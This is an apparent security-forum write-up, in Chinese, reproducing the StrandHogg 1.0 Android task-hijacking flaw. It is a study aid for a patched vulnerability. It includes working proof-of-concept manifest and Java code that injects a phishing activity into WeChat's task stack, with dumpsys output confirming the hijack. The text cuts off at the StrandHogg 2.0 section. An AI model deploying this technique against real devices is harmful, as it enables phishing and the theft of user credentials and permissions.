
<mark class="encrypted">2e0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3M7X3!0E0L8$3&6Q4x3X3g2U0L8#2)9J5c8Y4u0W2M7$3!0#2M7X3y4W2M7#2)9J5c8X3c8G2N6$3&6D9L8$3q4V1M7#2)9J5c8Y4y4@1M7X3q4F1k6r3S2G2k6$3N6Q4x3X3c8S2L8X3c8J5L8$3W2V1i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5g2)9J5c8W2)9J5x3%4N6Z5j5i4c8Q4x3X3c8U0j5h3&6Q4x3X3c8S2i4K6u0V1M7r3!0@1k6h3&6@1K9h3q4D9i4K6u0V1j5i4c8@1j5h3y4C8k6i4u0Q4x3X3c8V1L8H3`.`.</mark>

<mark class="encrypted">6fdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3M7X3!0E0L8$3&6Q4x3X3g2U0L8#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1L8X3g2%4M7#2)9J5c8Y4c8Z5k6g2)9J5k6s2y4@1M7X3q4F1k6r3S2G2k6$3N6Q4x3X3c8$3N6h3I4F1k6i4u0S2j5X3W2D9K9i4c8&6i4K6u0r3i4K6t1K6K9r3q4K6i4K6u0V1M7%4c8J5j5h3&6V1K9r3!0Y4k6#2)9J5k6r3u0W2k6h3&6Q4x3X3c8S2j5Y4g2K6k6h3c8Q4x3X3c8A6L8W2)9J5k6s2u0W2j5h3I4Q4x3X3c8%4L8%4u0D9k6q4)9J5k6r3y4S2M7$3g2K6</mark>

<mark class="encrypted">153K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3j5h3I4V1P5i4x3@1i4K6u0r3M7q4)9J5c8U0p5@1z5o6M7&6y4U0l9@1i4K6u0W2K9s2c8E0L8l9`.`.</mark>

<mark class="encrypted">da9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3k6%4g2A6k6r3g2Q4x3V1k6@1L8%4m8A6j5%4y4Q4x3V1k6E0j5h3&6A6k6X3g2K6N6q4)9J5c8X3q4U0N6r3W2$3K9i4c8&6i4K6u0V1k6h3I4W2L8h3g2F1N6q4)9K6c8X3S2D9i4K6y4p5P5X3S2Q4x3X3c8U0L8R3`.`.</mark>

# Android strandhogg漏洞复现学习

## strandhogg1.0

该漏洞为一个 Android 任务栈劫持漏洞，在2019年披露，影响范围包括android10以下。该漏洞可以让恶意应用注入一个activity到他设定好的应用的顶层。因此恶意应用可以精心设计一个具有诱导性的activity注入到受害应用中进行攻击。

### 0x01前置知识:

- 任务和返回栈：任务就是一堆activity的集合，以堆栈的形式存放。当用户在主屏幕点击应用图标（或者其他方式）时，该应用的任务就会出现在前台。如果应用程序不存在任何任务（该应用程序最近未使用过），则会创建一个新任务，一个任务栈可以包含多个activity，当从一个activity启动一个新的activity时就会把他push进返回栈（不考虑android的启动模式），销毁时就返回上一个activity，当任务栈的最后一个 activity 被销毁时，将清除任务栈并退出程序，下次再进入程序时会创建新的任务栈。

![image-20220211121535746](https://bbs.kanxue.com/upload/attach/202202/942091_EVT7GD4Y3BTSBQR.jpg)

- android 的四个启动模式:`standard`，`singleTop`，`singleTask`，`singleInstance`。不是本文重点,需要了解可以看（aadK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8X3g2T1k6r3f1@1z5r3p5H3j5e0f1J5j5#2!0q4c8W2!0n7b7#2)9^5z5b7`.`.

启动模式会导致一个应用中可能不止一个任务栈，单独一个activity可以独享一个任务栈。一个任务栈中的activity可以来自不同的应用，同一个应用的activity也可能不在一个Task中。

![img](https://bbs.kanxue.com/upload/attach/202202/942091_K6X6BZVSMPNMH37.jpg)

activity属性：

|  |  |
| --- | --- |
| 1  2  3  4 | `<activity android:name=".inject_activity" android:allowTaskReparenting="true" android:taskAffinity="com.xx.mm"/> <activity` |

- `taskAffinity`（任务相似性）：用来标识activity与任务的联系，该属性如果没有被设置，就从自身的 Application 继承，Application 的`taskAffinity`，它的值为 Manifest 的包名，也就是`taskAffinity`默认属性为自身应用包名的字符串。那么该应用中的所有 activity 都具有同一相似性。具有相同`taskAffinity`属性的 activity归属同一任务（从用户的角度来看，则是归属同一“应用”），甚至可以在一个任务栈中放置不同应用中定义的activity。如果指定 activity 与任何任务均无相似性，可以将其设置为空字符串。
- `allowTaskReparenting`（任务重编）：这个属性会使该activity具有在任务栈被重新编排的能力，当下一次将启动 activity 的任务转至前台时， activity 是否可以从启动它的任务移动到和它具有相同`taskAffinity`属性的任务，转移的时机是在具有相同`taskAffinity`属性的任务转移到前台时，true代表能够移动，并且false如果它必须留在它所在的任务中。它不会立即将攻击者活动转移到其目标上。只是当下次启动目标任务时，Android 操作系统会评估所有任务和活动，并查找标记有此属性的活动并在启动相关任务之前移动它们。由于任务栈的`taskAffinity`值该栈中的根activity永远一致，具有“`singleTask`”或“`singleInstance`”启动模式的 activity 只能位于任务的根，因此[android 的官方文档](https://bbs.kanxue.com/elink@c36K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3k6%4g2A6k6r3g2Q4x3V1k6@1L8%4m8A6j5%4y4Q4x3V1k6E0j5h3&6A6k6X3g2K6N6q4)9J5c8X3q4U0N6r3W2$3K9i4c8&6i4K6u0V1k6h3I4W2L8h3g2F1N6q4)9K6c8X3S2D9i4K6y4p5P5X3S2Q4x3X3c8U0L8R3`.`.)认为这两种启动模式对`allowTaskReparenting`是没有意义的，但该漏洞利用的就是看似没有意义的`singleTask`启动模式。这样可以使恶意的activity放到受害应用的任务栈的根位置。如果未设置此 `allowTaskReparenting` 属性，则元素的相应属性设置默认值为 false。

### 0x02 漏洞原理：

因为大部分应用的`taskAffinity`属性都没有设置，默认为其包名，那么就可以通过一个在恶意软件的一个hackactivity属性中设置跟我们攻击的应用的包名一致的`taskAffinity`值，那么该hackactivitystart的时候就会创建一个与victim应用的`taskAffinity`属性相同的一个任务栈，到时候会和victim的应用共享一个任务栈，并且位于该任务栈的根，在我们启动受害应用时，该victim的任务就会被放到前台，然后位于根的hackactivity就会放到前台，那么当我们打开受害应用所看到的activity，并不是该应用原有的activity，而是我们的hackactivity，那么我们可以在hackactivity设计成一个钓鱼页面，实现钓鱼攻击，获取用户的隐私和诱导用户授予恶意软件相应权限。

### 0x03漏洞设计：

三个activity，MainActivity用来启动其他的activity，Innocent是用来伪装自己的，通常是一个无害的界面，hack则是一个钓鱼界面。Hack中设`allowTaskReparenting`和`taskAffinity`两个属性，`taskAffinity`设计为指定应用的包名，但是没有设计启动模式为`singleTask`，只是在启动这个activity时，会对intent传入一个参数FLAG_ACTIVITY_NEW_TASK，这个在这里跟`singleTask`的作用是类似的，具体区别可以看9e3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7N6h3g2B7K9h3&6Q4x3X3g2U0L8W2)9J5c8Y4m8G2M7%4c8Q4x3V1j5$3z5o6b7@1z5e0l9K6z5e0M7@1x3U0j5&6y4U0b7^5z5e0l9K6i4@1f1K6i4K6R3H3i4K6R3J5

`AndroidManifest.xml`：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12 | `<activity android:name=".Innocent"><\/activity> <activity android:name=".Hack" android:allowTaskReparenting="true" android:taskAffinity="com.tencent.mm" /> <activity android:name=".MainActivity"> <intent-filter> <action android:name="android.intent.action.MAIN" /> <category android:name="android.intent.category.LAUNCHER" /> <\/intent-filter> <\/activity>` |

`MainActivity.java`：剩下的两个activity由于是没有什么实际意义的，只是修改ui，所以就没有放出

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19 | `public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //启动两个活动 Intent hack_intent; Log.d("MainActivity的TaskId", getTaskId() + ""); hack_intent=new Intent(this, Hack.class); //FLAG_ACTIVITY_NEW_TASK：相当于使用了launchMode=singleTop hack_intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(hack_intent); Intent innocent_intent; innocent_intent=new Intent(this,Innocent.class); startActivity(innocent_intent); //finish(); } }` |

安装后，第一次点击这个应用图标，使用`adb shell dumsys activity activities`查看任务栈

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17 | `Display #0 (activities from top to bottom): Stack #171: type=standard mode=fullscreen Task id #191 ··· Running activities (most recent first): //该应用的任务栈191中并没有Hackactivity的活动，而在另外一个新栈192中 TaskRecord{8780ff6 #191 A=com.test.strandhogg U=0 StackId=171 sz=2} Run #1: ActivityRecord{e19cde9 u0 com.test.strandhogg/.Innocent t191} Run #0: ActivityRecord{f021ac5 u0 com.test.strandhogg/.MainActivity t191} mResumedActivity: ActivityRecord{e19cde9 u0 com.test.strandhogg/.Innocent t191} Stack #172: type=standard mode=fullscreen Task id #192 ··· * TaskRecord{c609e64 #192 A=com.tencent.mm U=0 StackId=172 sz=1} //该任务没有被执行或者放到前台，所以没有ActivityRecord` |

此时，当我们返回桌面点击我们要攻击的应用就会将那个页面替换为我们的hackactivity。然后就完成了攻击

|  |  |
| --- | --- |
| 1  2  3  4  5 | `Stack #177: type=standard mode=fullscreen Task id #197 Running activities (most recent first): TaskRecord{4a0127f #197 A=com.tencent.mm U=0 StackId=177 sz=1} Run #0: ActivityRecord{4076818 u0 com.test.strandhogg/.Hack t197}` |

成功的效果应该是当我们安装好恶意应用后，当我们点击恶意应用图标时，显示的是我们的innocent这个无害界面，然后返回桌面再我们被攻击的应用，会发现界面会被替换成我们的hackactivity。演示视频放在附件。

### 0x04漏洞的修补：

现在`taskAffinity`属性只对相同UID的应用有效，也就是说，只有共享UID的应用才可以进行activity的移动，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变。一个应用程序只能有一个uid，多个应用可以使用`sharedUserId` 方式共享同一个uid，但前提是这些应用的签名要相同。恶意应用也无法伪造uid，导致无法实现攻击。

## strandhogg2.0（CVE-2020-0096）

### 0x01前言：

strandhogg2.0和strandhogg1.0均为同一家公司promo披露，相比strandhogg1.0必须明确地将他们的目标应用程序硬编码到 Android Manifest，strandhogg2.0并不需要在`androidmanifest.xml`上进行设计，而是在代码中实现，如有需要可以动态修改注入的应用程序，也可以同时对多个程序进行劫持。影响范围为android8和andorid9。

### 0x02漏洞原理:
